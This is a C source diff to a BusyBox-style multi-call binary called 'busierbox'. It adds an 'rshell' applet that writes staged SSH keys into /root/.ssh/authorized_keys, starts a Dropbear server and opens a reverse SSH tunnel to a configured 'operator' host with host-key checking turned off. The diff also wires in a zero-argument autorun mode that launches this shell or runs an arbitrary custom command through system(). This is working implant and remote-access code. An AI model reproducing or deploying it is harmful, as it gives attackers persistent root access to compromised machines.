@@ -8,6 +8,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
 
@@ -47,17 +48,11 @@
 #ifndef BB_FULL_ZERO_ARG_MODE
 #define BB_FULL_ZERO_ARG_MODE "help"
 #endif
-#ifndef BB_FULL_BOOTSTRAP_EXTRACT
-#define BB_FULL_BOOTSTRAP_EXTRACT "yes"
+#ifndef BB_ZERO_ARG_CUSTOM_COMMAND
+#define BB_ZERO_ARG_CUSTOM_COMMAND ""
 #endif
-#ifndef BB_FULL_BOOTSTRAP_DOCTOR
-#define BB_FULL_BOOTSTRAP_DOCTOR "yes"
-#endif
-#ifndef BB_FULL_BOOTSTRAP_CALLBACK
-#define BB_FULL_BOOTSTRAP_CALLBACK "no"
-#endif
-#ifndef BB_FULL_BOOTSTRAP_OPERATOR_SESSION
-#define BB_FULL_BOOTSTRAP_OPERATOR_SESSION "no"
+#ifndef BB_RSHELL_MODE
+#define BB_RSHELL_MODE "ssh"
 #endif
 #ifndef BB_AUTORUN_GUARD_ENABLE
 #define BB_AUTORUN_GUARD_ENABLE "yes"
@@ -70,6 +65,27 @@
 #endif
 #ifndef BB_AUTORUN_STALE_LOCK_POLICY
 #define BB_AUTORUN_STALE_LOCK_POLICY "recover"
+#endif
+#ifndef BB_OPERATOR_SERVER_HOST
+#define BB_OPERATOR_SERVER_HOST ""
+#endif
+#ifndef BB_OPERATOR_SERVER_USER
+#define BB_OPERATOR_SERVER_USER "operator"
+#endif
+#ifndef BB_OPERATOR_SERVER_SSH_PORT
+#define BB_OPERATOR_SERVER_SSH_PORT "22"
+#endif
+#ifndef BB_OPERATOR_REMOTE_FORWARD_PORT
+#define BB_OPERATOR_REMOTE_FORWARD_PORT "2200"
+#endif
+#ifndef BB_OPERATOR_TARGET_DROPBEAR_PORT
+#define BB_OPERATOR_TARGET_DROPBEAR_PORT "2222"
+#endif
+#ifndef BB_OPERATOR_TARGET_BIND_HOST
+#define BB_OPERATOR_TARGET_BIND_HOST "127.0.0.1"
+#endif
+#ifndef BB_OPERATOR_KNOWN_HOSTS_POLICY
+#define BB_OPERATOR_KNOWN_HOSTS_POLICY "off"
 #endif
 
 const struct bb_applet bb_applets[] = {
@@ -94,6 +110,7 @@ const struct bb_applet bb_applets[] = {
 #if BB_ENABLE_CALLBACK
     {"callback", applet_callback_main, "call back to operator station using stager protocol"},
 #endif
+    {"rshell", applet_rshell_main, "start configured reverse shell transport"},
 };
 
 const unsigned int bb_applet_count = sizeof(bb_applets) / sizeof(bb_applets[0]);
@@ -202,7 +219,7 @@ static int reentry_action(void)
 
 static int guard_needed(const char *mode)
 {
-    return !strcmp(mode, "callback") || !strcmp(mode, "bootstrap") || !strcmp(mode, "operator-session");
+    return !strcmp(mode, "callback") || !strcmp(mode, "shell") || !strcmp(mode, "custom");
 }
 
 static int acquire_autorun_guard(const char *mode)
@@ -213,7 +230,8 @@ static int acquire_autorun_guard(const char *mode)
     int fd;
     time_t now;
     if (!yes_value(BB_AUTORUN_GUARD_ENABLE) || !guard_needed(mode) ||
-        !strcmp(BB_AUTORUN_REENTRY_ACTION, "bootstrap-again"))
+        (!strcmp(BB_AUTORUN_REENTRY_ACTION, "bootstrap-again") ||
+         !strcmp(BB_AUTORUN_REENTRY_ACTION, "shell-again")))
         return 1;
     if (mkdir_p(guard_path) != 0) {
         fprintf(stderr, "autorun: unable to create guard path %s: %s\n", guard_path, strerror(errno));
@@ -248,50 +266,194 @@ retry:
     return 1;
 }
 
-static int run_bootstrap(void)
+static void shquote_append(char *dst, size_t dstsz, const char *src)
 {
-    int rc = 0;
-    char *extract_argv[] = { "extract", NULL };
-    char *doctor_argv[] = { "doctor", NULL };
-    char *callback_argv[] = { "callback", NULL };
-    if (yes_value(BB_FULL_BOOTSTRAP_EXTRACT))
-        rc = applet_extract_main(1, extract_argv);
-    if (rc == 0 && yes_value(BB_FULL_BOOTSTRAP_DOCTOR))
-        rc = applet_doctor_main(1, doctor_argv);
-    if (rc == 0 && yes_value(BB_FULL_BOOTSTRAP_CALLBACK))
-        rc = applet_callback_main(1, callback_argv);
-    if (yes_value(BB_FULL_BOOTSTRAP_OPERATOR_SESSION)) {
-        puts("operator_session_configured=yes");
-        puts("operator_session_started=no");
-        puts("operator_session_note=runtime Dropbear/dbclient bootstrap is not implemented in this launcher yet; use normal SSH catch instructions from menuconfig");
+    size_t used = strlen(dst);
+    const char *p;
+    if (used + 2 >= dstsz)
+        return;
+    dst[used++] = '\'';
+    dst[used] = '\0';
+    for (p = src ? src : ""; *p; p++) {
+        if (*p == '\'') {
+            if (used + 4 >= dstsz)
+                break;
+            memcpy(dst + used, "'\\''", 4);
+            used += 4;
+        } else {
+            if (used + 1 >= dstsz)
+                break;
+            dst[used++] = *p;
+        }
+        dst[used] = '\0';
     }
-    return rc;
+    if (used + 1 < dstsz) {
+        dst[used++] = '\'';
+        dst[used] = '\0';
+    }
+}
+
+static int path_exec(const char *path)
+{
+    return path && *path && access(path, X_OK) == 0;
+}
+
+int applet_rshell_main(int argc, char **argv)
+{
+    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX];
+    char hostkey[PATH_MAX], identity[PATH_MAX], authkeys[PATH_MAX], rootssh[PATH_MAX];
+    char cmd[8192] = "";
+    int rc;
+
+    if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
+        puts("usage: busierbox rshell");
+        puts("Starts the configured reverse shell transport. Current transport: ssh/dropbear/dbclient.");
+        return 0;
+    }
+    if (strcmp(BB_RSHELL_MODE, "ssh")) {
+        fprintf(stderr, "rshell: unsupported transport '%s'\n", BB_RSHELL_MODE);
+        return 2;
+    }
+    if (!BB_OPERATOR_SERVER_HOST[0]) {
+        fputs("rshell: operator host is not configured; set it in menuconfig under Payload Options -> Applet configuration -> Reverse shell\n", stderr);
+        return 2;
+    }
+    if (bb_ensure_payload_dir(payload, sizeof(payload)) != 0) {
+        fputs("rshell: payload unavailable; cannot start Dropbear/dbclient\n", stderr);
+        return 127;
+    }
+    snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
+    snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
+    snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
+    snprintf(hostkey, sizeof(hostkey), "%s/etc/dropbear/dropbear_rsa_host_key", payload);
+    snprintf(identity, sizeof(identity), "%s/home/.ssh/id_dbclient", payload);
+    snprintf(authkeys, sizeof(authkeys), "%s/home/.ssh/authorized_keys", payload);
+    snprintf(rootssh, sizeof(rootssh), "%s", "/root/.ssh");
+
+    if (!path_exec(dropbear) || !path_exec(dbclient)) {
+        fputs("rshell: dropbear/dbclient are not staged; enable dropbear in Heavy tools and rebuild\n", stderr);
+        return 127;
+    }
+    if (access(identity, R_OK) != 0) {
+        fprintf(stderr, "rshell: dbclient identity not staged at %s; prepare reverse shell defaults in menuconfig and rebuild\n", identity);
+        return 127;
+    }
+
+    strcat(cmd, "set -eu; ");
+    strcat(cmd, "mkdir -p ");
+    shquote_append(cmd, sizeof(cmd), rootssh);
+    strcat(cmd, " ");
+    strcat(cmd, "$(dirname ");
+    shquote_append(cmd, sizeof(cmd), hostkey);
+    strcat(cmd, "); ");
+    strcat(cmd, "if [ -f ");
+    shquote_append(cmd, sizeof(cmd), authkeys);
+    strcat(cmd, " ]; then cat ");
+    shquote_append(cmd, sizeof(cmd), authkeys);
+    strcat(cmd, " >>/root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
+    strcat(cmd, "if [ ! -f ");
+    shquote_append(cmd, sizeof(cmd), hostkey);
+    strcat(cmd, " ] && [ -x ");
+    shquote_append(cmd, sizeof(cmd), dropbearkey);
+    strcat(cmd, " ]; then ");
+    shquote_append(cmd, sizeof(cmd), dropbearkey);
+    strcat(cmd, " -t rsa -f ");
+    shquote_append(cmd, sizeof(cmd), hostkey);
+    strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
+    shquote_append(cmd, sizeof(cmd), dropbear);
+    strcat(cmd, " -r ");
+    shquote_append(cmd, sizeof(cmd), hostkey);
+    strcat(cmd, " -p ");
+    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
+    strcat(cmd, " -F -E >/tmp/busierbox-dropbear.log 2>&1 & dbpid=$!; ");
+    shquote_append(cmd, sizeof(cmd), dbclient);
+    strcat(cmd, " -i ");
+    shquote_append(cmd, sizeof(cmd), identity);
+    if (!strcmp(BB_OPERATOR_KNOWN_HOSTS_POLICY, "off"))
+        strcat(cmd, " -y");
+    strcat(cmd, " -K 30 -N -R ");
+    shquote_append(cmd, sizeof(cmd), "127.0.0.1:" BB_OPERATOR_REMOTE_FORWARD_PORT ":" BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
+    strcat(cmd, " -p ");
+    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_SSH_PORT);
+    strcat(cmd, " ");
+    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_USER "@" BB_OPERATOR_SERVER_HOST);
+    strcat(cmd, " >/tmp/busierbox-dbclient.log 2>&1 & dcpid=$!; ");
+    strcat(cmd, "echo rshell_started=yes; echo dropbear_pid=$dbpid; echo dbclient_pid=$dcpid; ");
+    strcat(cmd, "echo connect_hint='ssh -p " BB_OPERATOR_REMOTE_FORWARD_PORT " root@127.0.0.1'");
+
+    /* Use popen so we can capture the dropbear PID and write it to the autorun
+     * guard lock.  This prevents a second zero-arg busierbox invocation (e.g.
+     * from inside the reverse tunnel) from triggering another rshell while
+     * dropbear is still alive. */
+    {
+        FILE *fp;
+        char line[256];
+        long dropbear_pid = -1;
+        int exit_status = 0;
+
+        fp = popen(cmd, "r");
+        if (!fp)
+            return 1;
+        while (fgets(line, sizeof(line), fp)) {
+            fputs(line, stdout);
+            fflush(stdout);
+            if (strncmp(line, "dropbear_pid=", 13) == 0)
+                dropbear_pid = strtol(line + 13, NULL, 10);
+        }
+        rc = pclose(fp);
+        if (rc != -1 && WIFEXITED(rc))
+            exit_status = WEXITSTATUS(rc);
+
+        /* Write/update the autorun guard lock with dropbear's PID so that
+         * subsequent zero-arg invocations see a live process and block. */
+        if (dropbear_pid > 0 && yes_value(BB_AUTORUN_GUARD_ENABLE)) {
+            char lock_path[PATH_MAX];
+            int lfd;
+            const char *gp = autorun_guard_path();
+            mkdir_p(gp);
+            snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", gp);
+            lfd = open(lock_path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+            if (lfd >= 0) {
+                dprintf(lfd, "mode=rshell\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n",
+                        dropbear_pid, (long)time(NULL), BUSIERBOX_ARTIFACT_TIER);
+                close(lfd);
+            }
+        }
+        return exit_status;
+    }
+}
+
+static int run_custom_zero_arg(void)
+{
+    int rc;
+    if (!BB_ZERO_ARG_CUSTOM_COMMAND[0]) {
+        fputs("zero-arg custom mode selected but BB_ZERO_ARG_CUSTOM_COMMAND is empty\n", stderr);
+        return 2;
+    }
+    rc = system(BB_ZERO_ARG_CUSTOM_COMMAND);
+    if (rc == -1)
+        return 1;
+    if (WIFEXITED(rc))
+        return WEXITSTATUS(rc);
+    return 1;
 }
 
 static int run_zero_arg_mode(const char *mode)
 {
-    char *survey_argv[] = { "survey", NULL };
-    char *doctor_argv[] = { "doctor", NULL };
     char *callback_argv[] = { "callback", NULL };
+    char *rshell_argv[] = { "rshell", NULL };
 
-    if (!mode || !*mode || !strcmp(mode, "help") || !strcmp(mode, "menu")) {
+    if (!mode || !*mode || !strcmp(mode, "help") || !strcmp(mode, "menu") ||
+        !strcmp(mode, "survey") || !strcmp(mode, "doctor")) {
         usage(!mode || !*mode || !strcmp(mode, "help") ? stderr : stdout);
         return !mode || !*mode || !strcmp(mode, "help") ? 2 : 0;
     }
-    if (!strcmp(mode, "survey"))
-        return applet_survey_main(1, survey_argv);
-    if (!strcmp(mode, "doctor"))
-        return applet_doctor_main(1, doctor_argv);
     if (!strcmp(mode, "callback"))
         return applet_callback_main(1, callback_argv);
-    if (!strcmp(mode, "bootstrap"))
-        return run_bootstrap();
-    if (!strcmp(mode, "operator-session")) {
-        puts("operator_session_configured=yes");
-        puts("operator_session_started=no");
-        puts("operator_session_note=runtime Dropbear/dbclient bootstrap is not implemented in this launcher yet; explicit commands still work");
-        return 0;
-    }
+    if (!strcmp(mode, "shell") || !strcmp(mode, "bootstrap") || !strcmp(mode, "operator-session"))
+        return applet_rshell_main(1, rshell_argv);
+    if (!strcmp(mode, "custom"))
+        return run_custom_zero_arg();
     fprintf(stderr, "unknown zero-arg mode: %s\n", mode);
     usage(stderr);
     return 2;
